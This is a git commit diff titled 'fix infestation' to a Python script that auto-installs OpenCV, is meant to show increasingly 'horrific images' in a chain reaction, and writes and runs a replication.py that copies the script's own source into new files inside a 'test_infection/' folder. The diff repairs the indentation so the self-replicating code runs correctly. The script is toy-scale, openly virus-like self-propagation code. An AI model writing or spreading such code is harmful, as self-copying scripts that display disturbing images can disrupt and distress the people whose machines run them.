72cfbf08f47776110364546b3b1342831da61388
Dorian Delorme <doriandelorme@outlook.fr>
2023-03-13 16:18:57 +0100

    fix infestation

--- infestation.py
+++ infestation.py
@@ -9,6 +9,7 @@
         # more and more horrific images will be displayed, faster and more often, in a chain reaction.
 
 import importlib
+import sys
 
 def install(package):
     import subprocess
@@ -26,7 +27,6 @@ def import_or_install(package):
 import_or_install("opencv-python")
 
 
-import sys # to access the system
 import cv2
 import tkinter as tk
 import random
@@ -42,23 +42,23 @@ symbols_folder = "symbols/"
 
 with open("replication.py", "w") as f:
     f.write('''
-    import os
+import os
 
-    # ouvrir le fichier source
-    with open('infestation.py', 'r') as f:
-        source_code = f.read()
+# ouvrir le fichier source
+with open('infestation.py', 'r') as f:
+    source_code = f.read()
 
-    # spécifiez le chemin d'accès au dossier pour écrire les fichiers
-    folder_path = "test_infection/"
+# spécifiez le chemin d'accès au dossier pour écrire les fichiers
+folder_path = "test_infection/"
 
-    # parcourir tous les fichiers du dossier
-    for i, filename in enumerate(os.listdir(folder_path)):
-        # vérifiez que le fichier est un fichier Python
-        if filename.endswith(".py"):
-            # ouvrir le fichier et écrire le code source
-            with open(os.path.join(folder_path, f"infestation_{i}.py"), 'w') as f:
-                f.write(source_code)
-    ''')
+# parcourir tous les fichiers du dossier
+for i, filename in enumerate(os.listdir(folder_path)):
+    # vérifiez que le fichier est un fichier Python
+    if filename.endswith(".py"):
+        # ouvrir le fichier et écrire le code source
+        with open(os.path.join(folder_path, f"infestation_{i}.py"), 'w') as f:
+            f.write(source_code)
+''')
 
 subprocess.run(["python", "replication.py"])
 
